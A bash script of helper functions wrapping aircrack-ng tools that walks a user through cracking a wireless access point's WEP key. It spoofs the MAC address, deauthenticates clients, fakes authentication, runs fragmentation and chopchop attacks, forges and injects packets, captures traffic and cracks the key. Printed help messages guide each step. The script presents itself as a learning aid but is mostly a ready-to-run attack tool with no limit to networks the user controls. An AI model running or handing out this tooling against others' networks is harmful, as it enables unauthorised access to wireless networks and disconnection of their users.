#!/bin/bash

CONFIG="config.sh"
ESSID=""
CHANNEL=""
PASSWORD=""
KEY=""
MYMAC=""
CAPTURE_PACKETS="capture"
INJECT_PACKETS="inject"
CAPSRC=""
PRGA=""
SOURCE_IP="255.255.255.255"
DESTINATION_IP="$SOURCE_IP"
SOURCE_PORT=""
DESTINATION_PORT="$SOURCE_PORT"
CRACKED="cracked"

# Kills possible disturbing applications
function killdisturbing() {
    airmon-ng check eth1 | awk '/Process with PID ([0-9]*)/ { print $4 }' | xargs kill -15
}

# {{{ airmon-ng $IFACE wrappers: aircheck, airstart, airstop
# Usage: aircheck
#
# Check if $IFACE is ready
function aircheck() {
    airmon-ng check $IFACE
}

# Starts airmon-ng on $IFACE for any channel
function airstart() {
    airmon-ng start $IFACE
}

# Stops airmon-ng on $IFACE
function airstop() {
    airmon-ng stop $IFACE
}
# }}}

# Usage: newmac <mac address>
#
# Sets <mac address> to $IFACE.
# If <mac address> is empty, then generate a random one.
function newmac() {
    killdisturbing; airstop &> /dev/null
    
    if [[ $1 == "" ]]; then
        MYMAC=`macchanger -r $IFACE | awk '{ print $3 }' | head -n 2 | tail -n 1`
    else
        MYMAC=`macchanger -m $1 $IFACE | awk '{ print $3 }' | head -n 2 | tail -n 1`
    fi

    airstart &> /dev/null

    save
}
# Scan air, dump results, when user has what is needed for starthacking:
# display hacking help message
function viewaps() {
    airodump-ng $IFACE
    helphacking
}

# Usage: deauth STATION
#
# Where STATION is the client mac address to deauth
function deauth() {
    aireplay-ng -0 1 -c $1 -a $BSSID $IFACE
}

# Usage: starthacking <essid> <bssid> <channel>
#        starthacking <essid>
#
# Either from $ESSID/config.sh, either from arguments (which are then saved).
# Folder $ESSID will also be useful to stock access point specific files.
function starthacking() {
    ESSID="$1"
    DIR="$ESSID"
    CONFIG="config.sh"

    if test -d $ESSID; then
        if test -f $ESSID/$CONFIG; then
            cd $ESSID
            source $CONFIG
	else
	    echo "Specify BSSID and CHANNEL to register a new AP!"
	    return 1
	fi
    else
        BSSID="$2"
        CHANNEL="$3"
        mkdir $ESSID
	cd $ESSID

	save
    fi
}

# Usage: save [<config file=config.sh>]
#
# Can overwrite $CONFIG.
#
# Saves all *our* environment variables to $CONFIG file.
function save() {
    if [[ $1 != "" ]]; then
        CONFIG="$1"
    fi
    
    echo "#!/bin/bash" > $CONFIG
    echo "CONFIG=\"$CONFIG\"" >> $CONFIG
    echo ""
    echo "# Access point" >> $CONFIG
    echo "ESSID=\"$ESSID\"" >> $CONFIG
    echo "BSSID=\"$BSSID\"" >> $CONFIG
    echo "CHANNEL=\"$CHANNEL\"" >> $CONFIG
    echo "PASSWORD=\"$PASSWORD\"" >> $CONFIG
    echo "KEY=\"$KEY\"" >> $CONFIG
    echo "# User" >> $CONFIG
    echo "MYMAC=\"$MYMAC\"" >> $CONFIG
    echo "# Files" >> $CONFIG
    echo "CAPTURE_PACKETS=\"$CAPTURE_PACKETS\"" >> $CONFIG
    echo "INJECT_PACKETS=\"$INJECT_PACKETS\"" >> $CONFIG
    echo "CAPSRC=\"$CAPSRC\"" >> $CONFIG
    echo "PRGA=\"$PRGA\"" >> $CONFIG
    echo "SOURCE_IP=\"$SOURCE_IP\"" >> $CONFIG
    echo "SOURCE_PORT=\"$SOURCE_PORT\"" >> $CONFIG
    echo "DESTINATION_PORT=\"$DESTINATION_PORT\"" >> $CONFIG
    echo "DESTINATION_IP=\"$DESTINATION_IP\"" >> $CONFIG
    echo "CRACKED=\"$CRACKED\"" >> $CONFIG
}

# Usage: load [<config file=config.sh>]
#
# Can overwrite $CONFIG
#
# Loads environment variables from $CONFIG file.
# Check it out: cat $CONFIG
function load() {
    if [[ $1 != "" ]]; then
        CONFIG="$1"
    fi

    source $CONFIG
}

# Sets channel $CHANNEL to interface $IFACE, stops hoping.
function channellock() {
    iwconfig $IFACE channel $CHANNEL
}

# Fake authentication attack, fast version
function fakeauth() {
    echo "This is what you want to see: Association successful :-)"
    echo "And you don't want to see: Got deauthentication packet!"
    
    aireplay-ng -1 0 -e $ESSID -a $BSSID -h $MYMAC $IFACE
}

# Fake authentication attack, picky-AP version
#
# You might need if the fakeauth works but that the AP drops the association
# for some reason, *after* it worked.
function fakeauthpicky() {
    echo "This is what you want to see: Association successful :-)"
    echo ""

    aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $MYMAC $IFACE
}

# Usage: frag
#
# Waits for vulnerable beacon frame for the user to accept fraging the
# $PRGA file
# The vulnerable beacon frames that were found are written to $CAPSRC
function frag() {
    aireplay-ng -5 -h $MYMAC -b $BSSID $IFACE
    
    CAPSRC=`ls --sort=time replay_src-* | head -n1`
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}

# Usage: autofrag
#
# Uses the first vulnerable beacon frame to frag the $PGRA file with IFACE
# The vulnerable beacon frame that was found are written to $CAPSRC
function autofrag() {
    aireplay-ng -5 -F -h $MYMAC -b $BSSID $IFACE
    
    CAPSRC=`ls --sort=time replay_src-* | head -n1`
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}

# Usage: refrag
#
# Restart frag'ing the $PGRA file from $CAPSRC with $IFACE
function refrag() {
    aireplay-ng -5 -F -r $CAPSRC -b $BSSID $IFACE
    
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}


# Usage: chopchop
#
# Waits for vulnerable beacon frame for the user to accept chopchoping the
# $PRGA file
# The vulnerable beacon frames that were found are written to $CAPSRC
function chopchop() {
    aireplay-ng -4 -h $MYMAC -b $BSSID $IFACE
    
    CAPSRC=`ls --sort=time replay_src-* | head -n1`
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}

# Usage: autochopchop
#
# Uses the first vulnerable beacon frame to chopchop the $PGRA file with IFACE
# The vulnerable beacon frame that was found are written to $CAPSRC
function autochopchop() {
    aireplay-ng -4 -F -h $MYMAC -b $BSSID $IFACE
    
    CAPSRC=`ls --sort=time replay_src-* | head -n1`
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}

# Usage: rechopchop
#
# Restart chopchop'ing the $PGRA file from $CAPSRC with $IFACE
function rechopchop() {
    aireplay-ng -4 -F -r $CAPSRC -b $BSSID $IFACE
    
    PRGA=`ls --sort=time *.xor | head -n1`

    save
}

# Usage: capture
#
# Dumps paquets read from $IFACE matching $CHANNEL and $BSSID to
# $CAPTURE_PACKETS
function capture() {
    CAPTURE_PACKETS="capture"

    airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_PACKETS $IFACE

    save
}

# Usage: forge
#
# Forges IVS generation paquets with $BSSID, $MYMAC, $PRGA and
# writes them to $INJECT_PACKETS
function forge() {
    INJECT_PACKETS="inject"

    if [[ $DESTINATION_PORT != "" ]]; then
        DESTINATION=$DESTINATION_IP
    else
        DESTINATION="$DESTINATION_IP:$DESTINATION_PORT"
    fi

    if [[ $SOURCE_PORT != "" ]]; then
        SOURCE=$SOURCE_IP
    else
        SOURCE="$SOURCE_IP:$SOURCE_PORT"
    fi

    packetforge-ng -0 \
                   -a $BSSID \
                   -h $MYMAC \
                   -k $SOURCE \
                   -l $DESTINATION \
                   -y $PRGA \
                   -w $INJECT_PACKETS
    save
}

# Usage: inject
#
# User selects the paquet from file $INJECT_PACKETS to replay with $IFACE
# spoofed as $MYMAC
function inject() {
    aireplay-ng -2 -F -h $MYMAC -r $INJECT_PACKETS $IFACE

    save
}

# Usage: autoinject
#
# Injects the first packet of $INJECT_PACKETS with $IFACE spoofed as $MYMAC
function autoinject() {
    aireplay-ng -2 -f -h $MYMAC -r $INJECT_PACKETS $IFACE

    save
}

# Cracks $CAPTURE_PACKETS corresponding to $BSSID with aircrack-ng, save the
# output to $CRACKED
function crack() {
    aircrack-ng -b $BSSID $CAPTURE_PACKETS*.cap >> $CRACKED
}

# Faster than crack() because searchs for alphanumeric only
function alphacrack() {
    aircrack-ng -z -b $BSSID $CAPTURE_PACKETS*.cap >> $CRACKED
}

# Parses $CRACKED and sets $KEY and $PASSWORD
function exportcrack() {
    KEY=`awk '/KEY FOUND/ { print $4 }' $CRACKED`

    # The following works with lines like the following:
    #      KEY FOUND! [ 5A:30:30:30:32:43:46:45:33:46:37:32:45 ] (ASCII: Z0002CFE3
    #        Decrypted correctly: 100%
    #
    # Don't know about other cases
    PASSWORD=`awk '/KEY FOUND/ { print $7 }' $CRACKED`
}

# User help ...
echo "Aircrack-ng WEP cracking bash helpers for undereducated newbies help."
echo "The objective of this script is to help learning to crack wep keys."
echo ""

# Usage: helpintro [<show navigation=true]
#
# Prints possible steps to setup the hacking and other help commands
function helpintro() {
    echo "Setup your network interface(s):"
    echo ""
    echo "0) Make sure that no disturbing app is running: killdisturbing"
    echo "-- or --"
    echo "0) If you are starting over again: airstop && cd .."
    echo ""
    echo "1) Select wireless network interface to use: IFACE=<interface>"
    echo "2) Change mac address: newmac"
    echo "3) Let airmon-ng start it: airstart"
    echo "4) Check APs: viewaps"
    
    # Print navigation by default
    if [[ $1 != "0" ]]; then
        echo ""
        echo "Read intro help text (this) again: helpintro"
        echo "Read hacking help text: helphacking"
	echo "Read last connect help text: helpconnect"
    fi
}

# Usage: helphacking [<show navigation=true>]
#
# Prints possible steps to crack a WEP key and other help commands
function helphacking() {
    echo "Start hacking"
    echo ""
    echo "0) Start hacking an AP: starthacking <essid> [<bssid> <channel>"
    echo "   Note: you are now in a directory specific to AP"
    echo "         your mac was changed and saved"
    echo "1) Lock monitor mode on the channel: channellock"
    echo "2) Fake-auth it: fakeauth"
    echo "3) Get the PRGA file (.xor):"
    echo "     Search for FRAGMENTATION VERSUS CHOPCHOP in man aireplay-ng"
    echo "     Non-interactive: autochopchop or autofrag"
    echo "     Interactive: chopchop or frag"
    echo "     Start over with the last vulnerable paquet saved:"
    echo "     rechopchop or refrag"
    echo ""
    echo "     If you keep getting deauthentication packets, run fakeauthpicky"
    echo "     while injecting"
    echo "4) Forge IVS to replay (aka inject): forge"
    echo "5) Start capturing: capture"
    echo "6) Replay forged packet: inject"
    echo "7) Crack the thousands of captured data: crack or alphacrack"

    # Print navigation by default
    if [[ $1 != 0 ]]; then
        echo ""
        echo "Read previous introduction help text with: helpintro"
        echo "Read hacking help text (this) with: helphacking"
	echo "Read next connect help text with: helpconnect"
    fi
}

function helpconnect() {
    echo "Connect to a configured wireless access point"
    echo ""
    echo "0) killdisturbing; airstop"
    echo "1) connect ESSID"

    # Print navigation by default
    if [[ $1 != 0 ]]; then
        echo ""
        echo "Read hacking help text (this) with: helphacking"
        echo "Read introduction help text with: helpintro"
    fi
}

function connect() {
    if [[ $CONFIG == "" ]]; then
        CONFIG="config.sh"
    fi
    
    source $1/$CONFIG
}

helpintro 0
helphacking 0
helpconnect 0
